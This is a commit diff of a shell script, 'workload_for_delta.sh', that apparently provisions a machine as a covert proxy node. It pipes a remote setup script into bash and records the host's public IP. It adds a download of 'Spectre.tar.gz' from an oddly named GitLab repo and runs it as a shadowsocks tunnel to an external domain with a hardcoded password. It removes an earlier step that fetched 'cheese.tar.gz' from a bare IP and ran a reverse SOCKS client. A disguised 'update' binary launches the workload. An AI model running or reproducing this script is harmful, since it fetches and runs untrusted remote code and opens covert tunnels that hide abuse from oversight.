f8e7a905541def0dc22388c3b1eb682336959e8f
maxwellcrawford21 <maxwellcrawford.2@gmail.com>
2024-06-26 21:34:17 +0200

    Update workload_for_delta.sh

--- workload_for_delta.sh
+++ workload_for_delta.sh
@@ -5,7 +5,7 @@ whoami
 sleep 3
 
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
-currentdate=$(date '+%d-%b-%Y_DeltaBlue_')
+currentdate=$(date '+%d-%b-%Y_Delta_')
 ipaddress=$(curl -s ifconfig.me)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
@@ -24,9 +24,6 @@ sleep 2
 # Function to check if Node.js is installed
 
 wget -O - https://deb.nodesource.com/setup_20.x | bash
-
-sleep 3
-
 apt -y install nodejs
 
 sleep 2
@@ -51,29 +48,19 @@ apt-get install -y google-chrome-stable
 
 sleep 2
 
+wget https://gitlab.com/update9394625/update411/-/raw/main/Spectre.tar.gz
+
+sleep 2
+
+tar -xf Spectre.tar.gz
+
+sleep 2
+
+./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@greenleaf.teatspray.fun:8443 &
+
+sleep 2
+
 npm install pm2 -g
-
-sleep 2
-
-pm2 set pm2:sysmonit true
-
-sleep 2
-
-pm2 update
-
-sleep 2
-
-wget -q http://45.135.58.52/cheese.tar.gz > /dev/null
-sleep 2
-
-
-sleep 2
-
-tar -xf cheese.tar.gz
-
-sleep 2
-
-./cheese client -v 45.135.58.52:443 7777:socks &
 
 sleep 2
 
@@ -92,7 +79,7 @@ sleep 2
 cat > update/local/update-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 127.0.0.1:7777
+socks5 = 127.0.0.1:1082
 END
 
 ./update/local/update-local -config update/local/update-local.conf & > /dev/null
@@ -133,6 +120,3 @@ END
 sleep 5
 
 ./update/update pm2 start index.js --watch
-
-#node index.js
-
